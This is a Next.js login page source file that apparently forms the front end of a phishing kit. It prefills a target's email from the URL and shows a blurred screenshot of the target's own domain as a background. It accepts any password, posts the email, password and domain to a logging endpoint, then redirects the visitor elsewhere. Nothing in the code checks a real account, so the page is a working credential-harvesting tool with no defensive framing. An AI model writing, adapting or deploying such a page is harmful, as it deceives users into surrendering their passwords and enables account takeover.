'use client'

import '../styles/globals.css'
import { useSearchParams } from 'next/navigation'
import { useState, useEffect } from 'react'

export default function LoginPage() {
  const params = useSearchParams()
  const preEmail = params.get('email') || ''
  const domain = params.get('domain') || ''

  const [email, setEmail] = useState(preEmail)
  const [confirmed, setConfirmed] = useState(!!preEmail)
  const [password, setPassword] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [errors, setErrors] = useState({ email: '', password: '' })
  const [screenshotUrl, setScreenshotUrl] = useState('')

  // Auto-confirm if email prefilled
  useEffect(() => {
    if (preEmail) setConfirmed(true)
  }, [preEmail])

  // Build screenshot URL when we have a domain
  useEffect(() => {
    if (domain) {
      const target = encodeURIComponent(`https://${domain}`)
      const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL || '/api/screenshot'
      setScreenshotUrl(`${base}?url=${target}`)
    }
  }, [domain])

  const validateEmail = (v: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)

  const handleEmail = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateEmail(email)) {
      setErrors({ ...errors, email: 'Invalid email' })
      return
    }
    setConfirmed(true)
    setErrors({ ...errors, email: '' })
  }

  const handlePass = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ ...errors, password: 'Minimum 5 characters' })
      return
    }
    setShowModal(true)
    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain }),
    })
    setTimeout(() => {
      window.location.href = 'https://testingmysite.com'
    }, 2000)
  }

  return (
    <div className="login-container relative">
      {/* Screenshot background */}
      {screenshotUrl && (
        <div className="absolute inset-0 overflow-hidden">
          <img
            src={screenshotUrl}
            alt={`Screenshot of ${domain}`}
            onLoad={() => console.log('✅ screenshot loaded')}
            onError={(e) => console.error('❌ failed to load screenshot', e)}
            className="w-full h-full object-cover opacity-20 filter blur-sm pointer-events-none"
          />
        </div>
      )}

      {/* Login Card */}
      <div className="login-card">
        <h1 className="text-2xl font-bold text-center mb-6">Login</h1>

        {!confirmed ? (
          <form onSubmit={handleEmail} className="space-y-4">
            <input
              type="email"
              value={email}
              onChange={e => setEmail(e.target.value)}
              placeholder="Enter your email"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.email && (
              <p className="text-sm text-red-600">{errors.email}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={handlePass} className="space-y-6">
            <div className="text-center mb-4">
              <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gray-400 flex items-center justify-center text-2xl text-white">
                {email[0]?.toUpperCase()}
              </div>
              <p className="text-gray-800 font-medium">{email}</p>
            </div>
            <input
              type="password"
              value={password}
              onChange={e => {
                setPassword(e.target.value)
                if (e.target.value.length >= 5 && errors.password) {
                  setErrors({ ...errors, password: '' })
                }
              }}
              placeholder="Enter your password"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.password && (
              <p className="text-sm text-red-600">{errors.password}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Login
            </button>
          </form>
        )}
      </div>

      {/* Submission Modal */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2 className="text-lg font-semibold text-gray-800">
              Please wait…
            </h2>
            <p className="mt-2 text-gray-600">
              Submitting your credentials.
            </p>
          </div>
        </div>
      )}
    </div>
  )
}
